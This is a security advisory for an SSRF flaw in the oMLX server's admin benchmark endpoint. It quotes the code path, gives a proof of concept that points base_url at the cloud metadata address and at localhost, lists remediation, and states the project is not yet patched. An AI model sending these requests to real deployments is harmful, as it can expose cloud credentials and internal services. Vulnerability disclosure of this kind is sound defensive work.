# SSRF via Benchmark External Endpoint in oMLX Admin Panel

## Summary
A Server-Side Request Forgery (SSRF) vulnerability exists in the oMLX LLM inference server admin panel benchmark feature. An authenticated administrator can configure an external benchmark endpoint with an arbitrary base_url. The validation only checks that the URL starts with http:// or https://, without any IP-based restriction. This allows an attacker with admin access to force the oMLX server to make HTTP requests to arbitrary targets including internal network services and cloud metadata endpoints.

## Details
The vulnerability originates in the ExternalEndpointConfig Pydantic model defined in omlx/admin/external_api.py (lines 53-97). The base_url field undergoes only a protocol prefix check (http:// or https://) via the validate_base_url validator. There is no check against internal IP ranges, loopback addresses, link-local addresses, or cloud metadata IPs.

Trust boundary failure: The admin panel is a privileged interface. When an admin configures an external benchmark endpoint, the server trusts the provided URL implicitly and makes outbound HTTP requests to it. This breaks the trust boundary between the intended use (testing external LLM APIs) and what the server actually permits (arbitrary HTTP requests to any reachable host).

Source-to-sink chain:
1. Entry point - POST /api/bench/start in omlx/admin/routes.py (lines 5937-5975): Admin submits JSON with optional external field parsed into BenchmarkRequest.
2. Propagation - omlx/admin/benchmark.py (lines 48-52): BenchmarkRequest.external is passed to the benchmark runner.
3. SSRF trigger - omlx/admin/benchmark.py (line 1181): client = ExternalAPIClient(request.external) creates HTTP client with attacker-controlled config.
4. Sink - omlx/admin/external_api.py (lines 162-180): ExternalAPIClient.__init__ constructs URL as f"{config.base_url}/chat/completions" and creates httpx.AsyncClient.

Core vulnerable code path:

```python
# omlx/admin/external_api.py:53-70
class ExternalEndpointConfig(BaseModel):
    """Connection settings for an external OpenAI-compatible endpoint."""
    base_url: str
    api_key: SecretStr = SecretStr("")
    model: str
    extra_body: dict[str, Any] = Field(default_factory=dict)

    @field_validator("base_url")
    @classmethod
    def validate_base_url(cls, v: str) -> str:
        v = v.strip().rstrip("/")
        if not v.startswith(("http://", "https://")):
            raise ValueError("base_url must start with http:// or https://")
        return v
```

Trust boundary failure: ExternalEndpointConfig accepts user-controlled base_url. The validator only checks http/https prefix with no IP filtering. An attacker can supply internal IPs like 169.254.169.254 (cloud metadata) or 127.0.0.1 (localhost).

```python
# omlx/admin/external_api.py:154-180
class ExternalAPIClient:
    def __init__(self, config: ExternalEndpointConfig, ...):
        self._config = config
        self._chat_url = f"{config.base_url}/chat/completions"
        headers = {}
        key = config.api_key.get_secret_value()
        if key:
            headers["Authorization"] = f"Bearer {key}"
        self._client = httpx.AsyncClient(
            headers=headers, timeout=timeout,
            limits=httpx.Limits(max_connections=64),
            transport=transport,
        )
```

SSRF sink: ExternalAPIClient.__init__ constructs the request URL by interpolating user-controlled config.base_url into f"{config.base_url}/chat/completions" and creates httpx.AsyncClient that sends real HTTP requests to the attacker-specified target.

```python
# omlx/admin/routes.py:5937-5977
@router.post("/api/bench/start")
async def start_benchmark(
    request: Request,
    is_admin: bool = Depends(require_admin),
):
    """Start a benchmark run."""
    from .benchmark import BenchmarkRequest, create_run, run_benchmark
    engine_pool = _get_engine_pool()
    if engine_pool is None:
        raise HTTPException(status_code=503)
    active = get_active_run()
    if active is not None:
        raise HTTPException(status_code=409)
    body = await request.json()
    try:
        bench_request = BenchmarkRequest(**body)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
```

Entry point: POST /api/bench/start accepts JSON body parsed into BenchmarkRequest. If body contains external field with base_url, it is passed to benchmark runner without IP-level validation. Requires admin auth via Depends(require_admin).

```python
# omlx/admin/benchmark.py:1171-1182
async def _run_external_benchmark(run: BenchmarkRun) -> None:
    """Execute a benchmark run against an external endpoint."""
    request = run.request
    total_tests = len(request.prompt_lengths) + len(request.batch_sizes)
    overall_start = time.perf_counter()
    client = ExternalAPIClient(request.external)
    try:
        await client.stream_chat_completion(
            messages=[{"role": "user", "content": _generate_external_prompt(32)}],
```

Propagation: _run_external_benchmark instantiates ExternalAPIClient with request.external (line 1181), passing the attacker-controlled ExternalEndpointConfig directly to the HTTP client.

## POC
### Prerequisites
The attacker must have a valid admin session cookie for the oMLX server. This can be obtained by knowing the API key and using POST /admin/api/login, or using GET /admin/auto-login?key=<api-key>. The server must have an initialized engine pool. No other throughput benchmark must be running.

### Step 1 - Obtain admin session
POST /admin/api/login with {"api_key": "<valid-api-key>", "remember": false}
Expected: HTTP 200 with Set-Cookie: omlx_admin_session=<token>

### Step 2 - Trigger SSRF targeting cloud metadata
POST /api/bench/start with Cookie: omlx_admin_session=<token>
Body: {"model_id": "any-model", "prompt_lengths": [1024], "generation_length": 128, "external": {"base_url": "http://169.254.169.254", "api_key": "", "model": "test"}}
Expected: Server sends HTTP POST to http://169.254.169.254/chat/completions (cloud metadata endpoint)

### Step 3 - Trigger SSRF targeting internal services
POST /api/bench/start with same cookie
Body: {"model_id": "any-model", "prompt_lengths": [1024], "external": {"base_url": "http://127.0.0.1:8080", "api_key": "", "model": "test"}}
Expected: Server sends HTTP POST to http://127.0.0.1:8080/chat/completions (local services)

## Impact
1. Cloud Metadata Access (Critical): Access instance metadata at 169.254.169.254 to retrieve temporary IAM credentials on cloud deployments.
2. Internal Network Reconnaissance (High): Use server as proxy to scan internal networks (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).
3. Network Boundary Bypass (High): Access services not reachable from attacker's position.
4. Local Service Interaction (Medium): Access 127.0.0.1-bound services on the oMLX host.

CVSS 3.1 Score: 7.2 (High)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N

## Remediation
1. Add IP address filtering to validate_base_url: block 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, ::1, fc00::/7, fe80::/10.
2. Add DNS resolution + post-resolution IP check to prevent DNS rebinding.
3. Restrict allowed ports to common API ports.
4. Add configurable destination allowlist.
5. Require HTTPS for external endpoints.

## Disclosure Notes
Discovered through static source code analysis of oMLX (https://github.com/jundot/omlx) on the main branch. Not yet disclosed to maintainer. No fix available. Workaround: avoid using external benchmark with untrusted URLs and do not expose admin panel to untrusted networks.

## Supplemental Information
### Affected products
- Ecosystem: self-hosted
- Package name: jundot/omlx
- Affected versions: main (current development head)
- Patched versions: to be confirmed

### Severity
- Scoring method: CVSS v3.1
- Score: 7.2
- Vector string: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N

### Weaknesses
- CWE: CWE-918 Server-Side Request Forgery (SSRF)
